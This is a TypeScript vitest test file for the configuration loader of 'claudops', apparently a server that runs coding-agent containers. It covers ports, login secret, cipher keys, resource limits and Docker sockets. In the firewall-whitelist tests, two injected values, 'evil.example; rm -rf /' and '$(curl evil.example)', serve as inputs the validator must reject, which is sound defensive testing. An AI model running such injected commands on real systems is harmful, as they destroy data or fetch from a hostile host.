import { describe, expect, it } from 'vitest';
import {
  ConfigError,
  DEFAULT_INSTANCE_LIMITS,
  defaultDockerSocket,
  defaultWebRoot,
  loadConfig,
  parseMemory,
} from '../src/config.ts';

/**
 * The login secret is mandatory (issue #9), so every case that is not about it
 * needs one. A helper rather than 24 literals: it is a precondition of loading a
 * config at all, not the subject of these assertions.
 */
const LOGIN_SECRET = 'a-shared-secret-long-enough';

function load(env: NodeJS.ProcessEnv = {}): ReturnType<typeof loadConfig> {
  return loadConfig({ CLAUDOPS_LOGIN_SECRET: LOGIN_SECRET, ...env });
}

describe('loadConfig', () => {
  it('falls back to defaults on an empty environment', () => {
    const config = load({});

    expect(config.host).toBe('0.0.0.0');
    expect(config.port).toBe(8080);
    expect(config.baseImage).toBe('claudops-base');
    expect(config.databaseFile).toBe('data/claudops.db');
  });

  it('reads host, port, database and image from the environment', () => {
    const config = load({
      CLAUDOPS_HOST: '127.0.0.1',
      CLAUDOPS_PORT: '9000',
      CLAUDOPS_DB: '/srv/claudops.db',
      CLAUDOPS_BASE_IMAGE: 'claudops-base:test',
    });

    expect(config).toMatchObject({
      host: '127.0.0.1',
      port: 9000,
      databaseFile: '/srv/claudops.db',
      baseImage: 'claudops-base:test',
    });
  });

  describe('web root', () => {
    it('points at the sibling web package by default', () => {
      // Slashes rather than a path join: the point is the location relative to
      // this package, on either platform.
      expect(defaultWebRoot().replaceAll('\\', '/')).toMatch(/\/web\/dist$/);
      expect(load({}).webRoot).toBe(defaultWebRoot());
    });

    it('is overridable, for a build that lives somewhere else', () => {
      expect(load({ CLAUDOPS_WEB_ROOT: '/srv/claudops/ui' }).webRoot).toBe(
        '/srv/claudops/ui',
      );
    });

    it('resolves the same directory from src and from dist', () => {
      // Anchored at the end, not compared whole: on Windows `resolve`
      // prefixes the current drive letter.
      expect(defaultWebRoot('/repo/server/src').replaceAll('\\', '/')).toMatch(
        /\/repo\/web\/dist$/,
      );
      expect(defaultWebRoot('/repo/server/dist').replaceAll('\\', '/')).toMatch(
        /\/repo\/web\/dist$/,
      );
    });
  });

  it('treats an empty variable as unset', () => {
    expect(load({ CLAUDOPS_HOST: '' }).host).toBe('0.0.0.0');
  });

  it('rejects a port that is not a port', () => {
    expect(() => load({ CLAUDOPS_PORT: 'http' })).toThrow(ConfigError);
    expect(() => load({ CLAUDOPS_PORT: '0' })).toThrow(ConfigError);
    expect(() => load({ CLAUDOPS_PORT: '70000' })).toThrow(ConfigError);
  });

  it('picks up the instance environment without ever inventing an API key', () => {
    const config = load({
      CLAUDE_CODE_OAUTH_TOKEN: 'oauth-token',
      CLAUDOPS_GIT_USER_NAME: 'claudops',
      CLAUDOPS_GIT_USER_EMAIL: 'claudops@example.invalid',
      ANTHROPIC_API_KEY: 'must-be-ignored',
    });

    expect(config.instanceEnv).toEqual({
      claudeOauthToken: 'oauth-token',
      gitUserName: 'claudops',
      gitUserEmail: 'claudops@example.invalid',
      firewallAllow: undefined,
    });
    expect(JSON.stringify(config)).not.toContain('must-be-ignored');
  });

  describe('login secret', () => {
    it('refuses to start without one', () => {
      // Unlike the secret key, absent is an error: the whole point of the login
      // is that the endpoints are unusable without it, and a server that runs
      // open because somebody forgot a variable does not have that property.
      expect(() => loadConfig({})).toThrow(ConfigError);
    });

    it('refuses one short enough to guess', () => {
      expect(() => loadConfig({ CLAUDOPS_LOGIN_SECRET: 'short' })).toThrow(ConfigError);
    });

    it('builds an auth that accepts exactly that secret', () => {
      const { auth } = load();

      expect(auth.matches(LOGIN_SECRET)).toBe(true);
      expect(auth.matches('something-else-entirely')).toBe(false);
    });

    it('keeps the secret out of the config object', () => {
      // Same reasoning as the cipher: an auth rather than the secret, because
      // this object reaches a log line eventually.
      expect(JSON.stringify(load())).not.toContain(LOGIN_SECRET);
    });

    it('leaves the session cookie insecure unless asked, because there is no TLS', () => {
      // A browser silently discards a Secure cookie that arrived over plain
      // http, and the login would appear to do nothing at all.
      expect(load().secureCookie).toBe(false);
      expect(load({ CLAUDOPS_SESSION_SECURE: '1' }).secureCookie).toBe(true);
    });
  });

  describe('firewall whitelist', () => {
    it('is unset by default, so the container uses its built-in list', () => {
      expect(load().instanceEnv.firewallAllow).toBeUndefined();
    });

    it('passes hosts and CIDRs through as written', () => {
      expect(load({ CLAUDOPS_FIREWALL_ALLOW: 'api.nuget.org, 10.9.8.0/24' }).instanceEnv).toMatchObject(
        { firewallAllow: 'api.nuget.org, 10.9.8.0/24' },
      );
    });

    it('refuses anything that is not a host list', () => {
      // The container skips a word it cannot parse, so an operator who wrote
      // shell in here would never learn the entry did nothing.
      expect(() => load({ CLAUDOPS_FIREWALL_ALLOW: 'evil.example; rm -rf /' })).toThrow(ConfigError);
      expect(() => load({ CLAUDOPS_FIREWALL_ALLOW: '$(curl evil.example)' })).toThrow(ConfigError);
    });
  });

  describe('instance limits', () => {
    it('caps an instance at two cores and four gigabytes by default', () => {
      expect(load({}).instanceLimits).toEqual({
        cpus: 2,
        memoryBytes: 4 * 1024 * 1024 * 1024,
      });
      expect(load({}).instanceLimits).toEqual(DEFAULT_INSTANCE_LIMITS);
    });

    it('takes the memory the way docker run takes it', () => {
      expect(parseMemory('512m')).toBe(512 * 1024 * 1024);
      expect(parseMemory('2G')).toBe(2 * 1024 * 1024 * 1024);
      expect(parseMemory('1.5g')).toBe(1.5 * 1024 * 1024 * 1024);
      expect(parseMemory('1024k')).toBe(1024 * 1024);
      expect(parseMemory('268435456')).toBe(268435456);
      expect(parseMemory('plenty')).toBeUndefined();
    });

    it('reads both limits from the environment', () => {
      expect(
        load({ CLAUDOPS_INSTANCE_CPUS: '1.5', CLAUDOPS_INSTANCE_MEMORY: '512m' })
          .instanceLimits,
      ).toEqual({ cpus: 1.5, memoryBytes: 512 * 1024 * 1024 });
    });

    it('refuses a limit that would produce a container nobody can use', () => {
      expect(() => load({ CLAUDOPS_INSTANCE_CPUS: '0' })).toThrow(ConfigError);
      expect(() => load({ CLAUDOPS_INSTANCE_CPUS: 'plenty' })).toThrow(ConfigError);
      expect(() => load({ CLAUDOPS_INSTANCE_MEMORY: '4tb' })).toThrow(ConfigError);
      // Docker's own floor is 6 MiB, and its refusal is less clear than ours.
      expect(() => load({ CLAUDOPS_INSTANCE_MEMORY: '1m' })).toThrow(ConfigError);
    });
  });

  describe('secret key', () => {
    const key = Buffer.alloc(32, 0x03);

    it('leaves the server without a cipher when no key is set', () => {
      expect(load({}).cipher.available).toBe(false);
    });

    it('builds a working cipher from base64 and from hex', () => {
      for (const raw of [key.toString('base64'), key.toString('hex')]) {
        const { cipher } = load({ CLAUDOPS_SECRET_KEY: raw });

        expect(cipher.available).toBe(true);
        expect(cipher.open(cipher.seal('pat-secret'))).toBe('pat-secret');
      }
    });

    it('refuses a key of the wrong size rather than running with a weak one', () => {
      expect(() => load({ CLAUDOPS_SECRET_KEY: 'too-short' })).toThrow(ConfigError);
      expect(() =>
        load({ CLAUDOPS_SECRET_KEY: Buffer.alloc(16).toString('base64') }),
      ).toThrow(ConfigError);
    });

    it('keeps the key material out of the config object', () => {
      // A Buffer serialises as every one of its bytes, and this object reaches a
      // log line eventually -- hence a cipher in the config and not a key.
      const serialised = JSON.stringify(load({ CLAUDOPS_SECRET_KEY: key.toString('base64') }));

      expect(serialised).not.toContain(key.toString('base64'));
      expect(serialised).not.toContain('Buffer');
    });
  });

  describe('docker transport', () => {
    it('uses the platform default socket', () => {
      expect(defaultDockerSocket('linux')).toBe('/var/run/docker.sock');
      expect(defaultDockerSocket('win32')).toBe('//./pipe/docker_engine');
      expect(load({}).dockerSocket).toBe(defaultDockerSocket());
    });

    it('leaves the transport to dockerode when DOCKER_HOST is set', () => {
      expect(load({ DOCKER_HOST: 'tcp://nuc:2375' }).dockerSocket).toBeUndefined();
    });

    it('lets an explicit DOCKER_SOCKET win over DOCKER_HOST', () => {
      const config = load({ DOCKER_HOST: 'tcp://nuc:2375', DOCKER_SOCKET: '/tmp/d.sock' });
      expect(config.dockerSocket).toBe('/tmp/d.sock');
    });
  });
});
